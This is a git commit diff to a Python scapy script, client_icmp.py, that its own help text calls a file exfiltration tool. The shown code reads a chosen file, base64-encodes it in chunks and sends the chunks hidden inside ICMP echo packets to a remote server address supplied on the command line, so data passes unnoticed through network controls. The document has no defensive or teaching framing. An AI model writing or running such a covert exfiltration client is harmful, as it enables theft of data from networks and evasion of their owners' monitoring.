e5034ee0d85b7197e1212d33c697acdc8919022c
itform-fr <131718750+itform-fr@users.noreply.github.com>
2024-06-28 00:43:33 +0200

    Update client_icmp.py

--- ICMP-FT/client_icmp.py
+++ ICMP-FT/client_icmp.py
@@ -1,30 +1,26 @@
+#!/usr/bin/python3
+from scapy.all import *
 import base64
 import argparse
-from scapy.all import *
-
 parser = argparse.ArgumentParser(description="exfiltration de fichiers")
 parser.add_argument('-a','--address', help='adresse du serveur auquel envoyer le fichier',dest='ip',type=str)
 parser.add_argument('-f','--file', help='nom du fichier à envoyer',dest='file',type=str)
+parser.add_argument('-o','--output-file', help='nom du fichier à créer sur le serveur',dest='out',type=str)
 
 args = parser.parse_args()
-fichier=args.file
-if not args.ip or not args.file:
+if not args.ip or not args.file or not args.out:
     parser.print_help()
     exit(1)
 filename = args.file
-
-with open(filename, "rb") as f:
-    while True:
-        ok=False
-        while not ok:
-          packet=IP(dst=args.ip)/ICMP(type=8)/Raw('test')
-          resp=sr1(packet)
-          if resp:
-              ok=True
-        bytes_read = f.read(8192)
-        if not bytes_read:
-            break
-
-        b64_payload = base64.b64encode(bytes_read)
-        packet=IP(dst=args.ip)/ICMP(type=8)/Raw(b64_payload)
-        send(packet,count=1)
+ip= args.ip
+out=base64.b64encode(b'F1l3' + b':' + args.out.encode())
+send(IP(dst=ip)/ICMP()/Raw(out))
+fichier=open(filename,'rb')
+s=conf.L3socket()
+while bytes:
+    bytes=fichier.read(1024)
+    message=base64.b64encode(b'F1l3' + b':') + base64.b64encode(bytes)
+    destination=IP(dst=ip)/ICMP()/Raw(message)
+    s.send(destination)
+s.close()
+fichier.close()
